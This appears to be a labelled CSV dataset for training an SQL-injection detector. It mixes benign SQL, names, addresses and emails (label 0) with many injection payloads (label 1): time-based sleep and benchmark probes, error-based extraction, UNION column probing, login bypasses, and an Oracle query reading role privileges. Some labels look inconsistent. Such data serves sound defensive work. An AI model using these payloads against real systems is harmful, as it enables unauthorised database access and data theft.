Query,Label
SELECT * FROM thick FETCH FIRST 3 ROWS ONLY,0
"SELECT * FROM forward WHERE gravity BETWEEN ""highway"" AND ""happened""",0
"1'|| ( select 'kbvq' where 9279 = 9279 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) ||'",1
1 ) as usnn where 3201 = 3201,1
SELECT column_name FROM table1 UNION,0
SELECT * FROM flow WHERE though = 'various' AND ( difficult = 'began' OR greatest = 'sentence' ),0
"1 ) as ooex where 1087 = 1087 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
SELECT TOP 3 * FROM Customers;,0
SELECT COUNT ( nobody ) FROM coffee,0
SELECT * FROM ( SELECT wild FROM deeply ),0
alvino,0
"' AND (SELECT SUBSTRING(@@version,1,1))='11' --",1
m601c1te,0
SELECT recall FROM separate UNION SELECT heavy FROM dear ORDER BY nearby,0
1' ) ) and 4242 = 5831 and ( ( 'xflh' like 'xflh,1
SELECT * FROM announced WHERE price NOT BETWEEN 'grass' AND 'nose',0
"1' union all select null,null,null,null,null#",1
1.20958E+14,0
1%' or sleep ( 5 ) #,1
manjarrs,0
6105,0
SELECT * FROM end WHERE empty NOT BETWEEN 'oxygen' AND 'everywhere',0
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 3 ) ) AND 'i' = 'i",1
"-4373%"" ) ) or 5672 = 5188--",1
"SELECT strawID AS ID, arrive AS if FROM alphabet",0
"SELECT spread AS plant, tears AS [mile] FROM month",0
destullecer,0
SELECT music ( s ) FROM garden LEFT JOIN,0
SELECT rhythm ( s FROM carried RIGHT JOIN,0
"select * from users where id = 1 or @<@ = 1 union select 1,version ( ) -- 1",1
"1%"" ) ) ) and 9198 = 9198--",1
-6616 ) order by 1--,1
"SELECT stairs AS cool, arrangement AS [truth] FROM forget",0
"1'|| ( select 'hrpa' where 1973 = 1973 union all select null,null,null,null,null,null,null,null,null--",1
1' where 5035 = 5035 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1
1 ) where 6950 = 6950 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,1
aleandro-hayman@tecnoindomo.nr,0
"-2916"" ) ) or 4946 = 8232--",1
50700,0
SELECT * FROM diagram WHERE string = 'bicycle' FETCH FIRST 3 ROWS ONLY,0
ridgeley_fechner@beesmer.ye,0
veneranda,0
SELECT * FROM left WHERE form BETWEEN 10 AND 20,0
SELECT * FROM plus WHERE close BETWEEN 'army' AND 'thee',0
SELECT * FROM product WHERE orange = sudden,0
6.3087E+15,0
algu chavarri,0
SELECT * FROM ( SELECT hunt FROM shelf ),0
1'+ ( select 'hjku' where 1954 = 1954 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) +',1
"1 ) where 2473 = 2473 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",1
"c/ juan de rihuerga, 0,",0
volkmann_parfrey1@sigloventidos.be,0
SELECT AVG ( spent ) FROM my,0
SELECT TOP 3 * FROM thrown SELECT * FROM became 3SELECT * FROM little,0
select ( case when ( 5847 = 2826 ) then 5847 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1
"SELECT user_id, meta_key, meta_value FROM wp_usermeta WHERE user_id IN ( 1 ) ORDER BY umeta_id ASC",0
"1 ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( 8554 = 8554",1
select pg_sleep ( 5 ) and ( 'vnss' like 'vnss,1
"1"" ) as xwnu where 6490 = 6490 union all select null,null,null,null,null,null--",1
sienes,0
"-5644"" ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( ""evcf"" = ""evcf",1
"SELECT my,spoken FROM record WHERE music = 'cross' UNION SELECT lion, make FROM tight",0
UPDATE society SET dog = 'negative'WHERE tears = 'cold',0
"1' ) ) as agdn where 8442 = 8442 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",1
SELECT TOP 50 PERCENT * FROM discovery SELECT * FROM habit FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM kids,0
"-2384'|| ( select 'vhcp' from dual where 1266 = 1266 union all select 1266,1266,1266,1266--",1
"SELECT * FROM hurt ORDER BY bound, ride",0
1 ) ) as wrhe where 6120 = 6120 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
-2891 where 1770 = 1770 or 9290 = 5866,1
select ( case when ( 4719 = 8852 ) then 1 else 4719* ( select 4719 from master..sysdatabases ) end ) --,1
"-8487' ) where 9655 = 9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--",1
22809,0
SELECT * FROM fuel FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM told,0
SELECT * FROM person FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM frog,0
SELECT TOP 50 PERCENT * FROM instant SELECT * FROM managed FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM nine,0
1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( 'zqiw' = 'zqiw,1
lafayette@vitalhome.hk,0
"SELECT * FROM aside ORDER BY swam, ball",0
"SELECT Orders.knownrID, Employees.whale, Employees.instead FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.settlersID ORDER BY Orders.houseID",0
58743816e,0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id WHERE tt.taxonomy IN ( 'wp_theme' ) AND t.name IN ( 'houzez-child' )",0
SELECT * FROM silence FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM engineer,0
SELECT COUNT ( whale ) FROM chamber,0
1' ) ) ) waitfor delay '0:0:5'--,1
"1%"" ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
c/ coca de la piera 167,0
"-6587' ) union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",1
SELECT * FROM expression WHERE path = 'touch' LIMIT 3,0
etienne-wray@juegois.je,0
meleskie,0
37655511a,0
SELECT * FROM to WHERE rise IN ( SELECT difficulty FROM willing ),0
SELECT TOP 3 * FROM coach WHERE strike = 'split' SELECT * FROM fellow,0
38507707a,0
SELECT * FROM accept WHERE condition IN ( SELECT nearby FROM gift ),0
"exec sp_addlogin 'name' , 'password'",1
2esco63enti2,0
SELECT weather ( s ) FROM out SELECT am ( s ),0
SELECT * FROM queen WHERE riding BETWEEN 'yet' AND 'excitement',0
value'--,1
"-1988 where 4597 = 4597 union all select 4597,4597,4597,4597,4597,4597--",1
"1 or benchmark ( 10000000,MD5 ( 1 ) ) #",1
"INSERT INTO standard ( pond, real, tune ) VALUES ( 'choice', 'sudden', 'tax' )",0
hervs,0
"SELECT Orders.fifteenrID, Employees.attempt, Employees.date FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.forestID ORDER BY Orders.anywayID",0
-9975 where 9760 = 9760 order by 1--,1
"1%"" ) ) rlike ( select ( case when ( 4207 = 1757 ) then 1 else 0x28 end ) ) and ( ( ""%"" = """,1
"1"" and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
1 waitfor delay '0:0:5',1
1 ) ) as klmm where 3107 = 3107,1
SELECT * FROM divide WHERE went = 'selection' LIMIT 3,0
rub,0
UPDATE salt SET did = 'garden'WHERE orange = 'exclaimed',0
"-1830"" ) ) as bptv where 4805 = 4805 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",1
"1 ) where 5048 = 5048 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
"1' in boolean mode ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) #",1
"1 ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",1
"SELECT column_name ( s ) FROM our,swept",0
-2393%' ) ) union all select 2772--,1
SELECT * FROM flag WHERE thrown = 'hour' AND ( heart = 'spell' OR open = 'massage' ),0
pueblica de valverde,0
"-9725 ) where 9068 = 9068 or elt ( 4723 = 1426,1426 ) --",1
SELECT * FROM to WHERE pot = 'worker' FETCH FIRST 3 ROWS ONLY,0
SELECT COUNT ( DISTINCT environment ) FROM metal,0
"SELECT careful,tail,weight FROM wrote LEFT JOIN Orders ON eager.dogID = past.fine ORDER BY recent.tea",0
SELECT * FROM difficult WHERE sick LIKE '%serve%',0
SELECT TOP 50 PERCENT * FROM butter SELECT * FROM tribe FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM please,0
SELECT news ( s ) FROM seven,0
admin' ) or ( '1' = '1'--,1
SELECT option_value FROM wp_options WHERE option_name = '_options_footer_button_2_text' LIMIT 1,0
"select * from users where id = 1 or 1#""1 union select null,version ( ) -- 1",1
"1' ) ) as efmy where 7299 = 7299 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"1' ) where 2284 = 2284 and make_set ( 8403 = 8403,8899 ) --",1
"luis de gongora, 189",0
"c/ lorenzo solano tendero, s/n 8b",0
1 ) ) and 3228 = 7376#,1
1%' and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1
) union select * from information_schema.tables;,1
SELECT * FROM depth WHERE mountain = 'women' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM Customers WHERE City LIKE '[a-c]%';,0
SELECT * FROM born 3,0
SELECT * FROM torn WHERE addition LIKE '%hide%',0
"SELECT goldID AS ID, wheat AS running FROM poem",0
alberuela de tubo,0
"SELECT * FROM lonely ORDER BY correctly, meal",0
SELECT factory ( s ) FROM cell UNION,0
senderow,0
1.8461E+15,0
1' ) ) as nsfx where 9553 = 9553 rlike sleep ( 5 ) --,1
-7610' or 3038 = 3038,1
96399738e,0
SELECT MIN ( buy ) AS forty FROM whom,0
1%' or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1
"1%"" ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""%"" = """,1
SELECT pool FROM particles,0
"select * from users where id = '1' <@<@ union select 1,version ( ) -- 1'",1
SELECT FLOOR ( 25 ) ;,1
"1' ) ) and elt ( 6847 = 5874,5874 ) and ( ( 'yspu' = 'yspu",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 21 ) ORDER BY meta_id ASC",0
%2A%28%7C%28mail%3D%2A%29%29,1
1 where 3027 = 3027 and 4595 = 4595#,1
segovia,0
doortje,0
"1%"" ) waitfor delay '0:0:5'--",1
29540,0
or ( EXISTS ),1
cervera del ro alhama,0
t16564l,0
"SELECT LEFT ( ""SQL Tutorial"", 3 ) AS ExtractString;",0
"1 and make_set ( 9542 = 8888,8888 ) -- idkn",1
forslund,0
"1"" ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ""nepk"" = ""nepk",1
pospisil,0
SELECT movie ( s FROM running RIGHT JOIN,0
UPDATE diagram SET ranch = 'its'WHERE statement = 'try',0
172,0
nakanishi@mariposasentudia.ec,0
SELECT MIN ( here ) AS desk FROM toward,0
1 ) ) ) order by 1--,1
SELECT COUNT ( DISTINCT command ) FROM return,0
"1 ) where 9829 = 9829 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
SELECT flew ( s ) FROM only UNION,0
"1 ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 2230 = 2230",1
7znallo,0
polit lauli,0
"1' ) ) as sxpk where 5524 = 5524 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1
haddon@hiperbarcelona.tl,0
"1', ( select ( case when ( 2106 = 2106 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else 2106* ( select 2106 from master..sysdatabases ) end ) )",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 7515 ) ORDER BY meta_id ASC",0
"1"" ) as yzzk where 1813 = 1813 and ( 3020 = 3020 ) *6703--",1
"1 ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null#",1
"1'+ ( select qmez where 3729 = 3729 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
SELECT desert ( s ) FROM molecular SELECT hour ( s ),0
2ariosamente,0
"SELECT substanceID AS ID, instant AS triangle FROM bush",0
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 7 ) ) AND 'i' = 'i",1
cusell vinageras,0
"1%"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",1
SELECT COUNT ( DISTINCT cover ) FROM run,0
freixes navaln,0
978,0
SELECT * FROM swing WHERE explain BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT AVG ( hand ) FROM final SELECT SUM ( slope ),0
"1'+ ( select gajr where 6653 = 6653 union all select null,null,null,null#",1
SELECT * FROM fruit WHERE toy NOT LIKE '[bend]%',0
sobrestante,0
canut escriba,0
"SELECT judge, cowboy, case FROM grow WHERE himself IS NULL",0
"-7194'|| ( select 'gbrx' from dual where 6205 = 6205 union all select 6205,6205,6205,6205,6205,6205,6205#",1
"1"" ) ) and 5421 = 4804--",1
SELECT * FROM topic WHERE came = 'mixture' LIMIT 3,0
"1 ) where 6954 = 6954 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",1
SELECT COUNT ( sport ) FROM wore,0
-9541 where 4291 = 4291 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1
"1%' ) ) ) and elt ( 7425 = 3843,3843 ) and ( ( ( '%' = '",1
SELECT * FROM above,0
de_souza,0
haslund@arvigar.sl,0
"1"" ) ) as tngu where 3644 = 3644 union all select null--",1
menju,0
pankiw,0
dotty,0
qu1s3da,0
SELECT shells ( s ) FROM people SELECT he ( s ),0
"-4373'+ ( select 'rlht' where 2285 = 2285 union all select 2285,2285,2285#",1
1;SELECT *,1
-8051 ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 5637 = 5637,1
"1'|| ( select 'adiv' from dual where 9842 = 9842 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||'",1
1 or sleep ( 5 ) #,1
"1 ) as jqbv where 8172 = 8172 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
peralejos de abajo,0
SELECT catch ( s ) FROM instant FULL OUTER JOIN,0
SELECT TOP 3 * FROM made WHERE scientist = 'daughter' SELECT * FROM list,0
4ip7237o8h2dira,0
"1"" ) ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
SELECT * FROM slipped WHERE printed BETWEEN themselves09/01/1996trouble AND your15/31/1996help,0
SELECT * FROM he WHERE castle IN ( SELECT somewhere FROM trace ),0
SELECT slow FROM result UNION SELECT similar FROM function ORDER BY swing,0
"1"" ) ) ) union all select null,null,null--",1
"1' ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 'sucj' = 'sucj",1
SELECT report ( s FROM anyway RIGHT JOIN,0
"1"" ) ) ) and 7135 = 8805#",1
-8071 ) ) or 9160 = 4253,1
"1' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'xkxi' like 'xkxi",1
"1"" ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""ksxz"" = ""ksxz",1
"avda. juan carlos i, 195, 6f",0
arcediano,0
DELETE FROM hot,0
-3496' ) ) or 9323 = 9323#,1
select sleep ( 5 ) and ( ( ( 'qjsc' = 'qjsc,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 6623 ) ORDER BY meta_id ASC",0
"pl. ingeniero torres quevedo, s/n 7?a",0
"1' ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( 'rnyb' = 'rnyb",1
SELECT * FROM flow WHERE choice BETWEEN '1996-07-01' AND '1996-07-31',0
"1"" where 4161 = 4161 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
SELECT * FROM garage WHERE pie BETWEEN '1996-07-01' AND '1996-07-31',0
"SELECT column_name ( s ) FROM sky,worth",0
"1"" ) ) and 4595 = 4595#",1
-2233' or ( 1807 = 7274 ) *7274,1
SELECT * FROM frame,0
"select * from users where id = 1 union select @&&@,version ( ) -- 1",1
SELECT * FROM choice WHERE substance = 'youth' LIMIT 3,0
-5500' ) order by 1--,1
"-8491"" where 9043 = 9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",1
SELECT * FROM still WHERE figure = 'steep' OR surface = 'series',0
"1' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 'xwhi' = 'xwhi",1
SELECT AVG ( join ) FROM rocky,0
"1'|| ( select 'dpje' where 2704 = 2704 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
1' ) ) as yqek where 1957 = 1957,1
gater9,0
"1"" and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ""gddl"" like ""gddl",1
perales salmern,0
"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'jjxn' = 'jjxn",1
SELECT throat,0
SELECT * FROM having WHERE flew = 'not' OR hill = 'say',0
SELECT * FROM should WHERE spell BETWEEN '1996-07-01' AND '1996-07-31',0
"1' ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
SELECT TOP 50 PERCENT * FROM running SELECT * FROM flower FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM recognize,0
SELECT AVG ( similar ) FROM cutting,0
SELECT COUNT ( won ) FROM should,0
SELECT AVG ( from ) FROM farmer SELECT SUM ( thirty ),0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 70699 ) ORDER BY meta_id ASC",0
"c/ veinat de cerdanyola, 3 6e",0
"1 ) as ihan where 5298 = 5298 and elt ( 6587 = 3479,3479 ) --",1
( select 2527 from pg_sleep ( 5 ) ),1
"-8106%"" ) union all select 2051,2051,2051,2051,2051,2051#",1
"1"" ) ) as tpeh where 6306 = 6306 and 5965 = 5806#",1
"1' ) union all select null,null,null,null,null,null,null,null,null,null#",1
"SELECT PERIOD_DIFF ( 201710, 201703 ) ;",0
"-4707' union all select 4414,4414,4414,4414,4414,4414#",1
"SELECT IF ( STRCMP ( ""hello"",""bye"" ) = 0, ""YES"", ""NO"" ) ;",0
-5708 where 3134 = 3134 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
calle conde de cartagena 97 5f,0
"1 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",1
SELECT * FROM shall WHERE feel BETWEEN 'phrase' AND 'hope',0
trigueros del valle,0
SELECT AVG ( principal ) FROM cow,0
SELECT pound ( s ) FROM seen,0
"masia can sang, 33",0
SELECT * FROM whale WHERE lamp = 'met' AND City = 'wooden',0
huelva,0
"SELECT * FROM around WHERE laugh BETWEEN ""research"" AND ""greatly""",0
( 8266 = 8266 ) *9900,1
"1'+ ( select blbd where 7451 = 7451 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) +'",1
SELECT TOP 50 PERCENT * FROM furniture SELECT * FROM change FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM then,0
farese@bloodline.as,0
SELECT TOP 3 * FROM ought WHERE attached = 'season',0
leonila,0
SELECT * FROM giant ORDER BY boy,0
SELECT attention ( s ) FROM trunk UNION,0
SELECT AVG ( Price ) FROM start,0
"avenida de europa 153,",0
SELECT top ( s ) FROM wonder,0
6.34191E+15,0
"1"" rlike sleep ( 5 ) #",1
SELECT DISTINCT swimming FROM happily,0
ciro,0
SELECT stared ( s ) FROM swung UNION,0
"-5187"" ) union all select 3373,3373#",1
"1"" ) where 2837 = 2837 and ( 3020 = 3020 ) *6703--",1
55119519l,0
1 ) where 7956 = 7956 or sleep ( 5 ) #,1
"SELECT full, leg, lovelyFROM cause WHERE fastened IS NOT NULL",0
"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",1
"1 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) # ogwe",1
teruel,0
1' ) as pghp where 9086 = 9086,1
SELECT AVG ( Price ) FROM western,0
1 ) as jvmv where 3857 = 3857 and ( 5717 = 6483 ) *6483--,1
itter,0
"1 ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users )",1
47815,0
select ( case when ( 2350 = 8682 ) then 2350 else 1/ ( select 0 ) end ) --,1
"1' ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'xuwl' like 'xuwl",1
fl5ct499t1,0
SELECT ago ( s FROM master RIGHT JOIN,0
"1', ( select ( case when ( 6750 = 6750 ) then 1 else 6750* ( select 6750 from information_schema.character_sets ) end ) )",1
"c/ moncayo, 36, 10-d",0
33279,0
8374f09a2,0
"-9389' where 5713 = 5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",1
SELECT * FROM species WHERE ill BETWEEN 'give' AND 'declared',0
"-2375 union all select 1573,1573,1573,1573#",1
"1', ( select ( case when ( 5249 = 9648 ) then 1 else 1/ ( select 0 ) end ) )",1
SELECT * FROM finger WHERE magnet NOT BETWEEN 'common' AND 'lucky',0
"1"" ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( ""yxpo"" like ""yxpo",1
SELECT * FROM industrial WHERE flag = queen,0
SELECT COUNT ( threeID ) FROM foreign,0
1' ) as bihs where 4197 = 4197,1
sisante,0
5h5c8,0
colvara pulve,0
1 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) -- fyaq,1
SELECT stay ( s ) FROM product INNER JOIN,0
"1' ) where 8835 = 8835 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
"1"" ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ""btht"" = ""btht",1
"-4256' ) where 9545 = 9545 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1
SELECT COUNT ( that ) FROM wealth,0
"SELECT school,frighten FROM furniture WHERE path = 'needed' UNION SELECT century, secret FROM bet",0
"1"" and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""qzzg"" like ""qzzg",1
"admin"" ) or ""1"" = ""1""#",1
SELECT * FROM this 3,0
"SELECT brought, worth, lady FROM stand WHERE current IS NULL",0
reith,0
1.02606E+15,0
SELECT TOP 50 PERCENT * FROM something,0
SELECT * FROM such WHERE from = 'wife',0
"1 ) as ezje where 5234 = 5234 and make_set ( 8403 = 8403,8899 ) --",1
7.54804E+15,0
SELECT measure ( s ) FROM yard UNION,0
SELECT once ( s ) FROM afraid UNION ALL,0
"SELECT women,mass,conversation FROM blind LEFT JOIN Orders ON reason.lunchID = instant.corn ORDER BY out.thus",0
9.51518E+15,0
1 waitfor delay '0:0:5'-- nnnp,1
p21urit56,0
SELECT * FROM fastened,0
-9191' ) as qtvm where 2838 = 2838 or ( 8459 = 8459 ) *4906--,1
"select * from users where id = '1' + @<@# union select 1,version ( ) -- 1'",1
larribea,0
SELECT * FROM increase WHERE duck NOT BETWEEN 'position' AND 'decide',0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 4069 ) ORDER BY meta_id ASC",0
"1%' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( '%' = '",1
1 where 4949 = 4949,1
